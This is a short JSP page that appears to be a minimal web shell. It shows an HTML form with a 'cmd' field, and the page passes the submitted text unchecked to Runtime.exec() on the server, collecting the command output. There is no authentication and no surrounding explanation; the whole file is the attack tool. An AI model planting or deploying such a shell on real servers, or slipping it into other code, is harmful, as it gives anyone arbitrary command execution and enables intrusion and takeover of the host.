<FORM METHOD=GET ACTION='test.jsp'> 
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run command'>
</FORM>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        out.println(cmd + " results: ");
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { 
                output += s + "</br>"; 
            }
        } catch(IOException e) { 
            e.printStackTrace(); 
            output = "Error executing command";
        }
    }
%>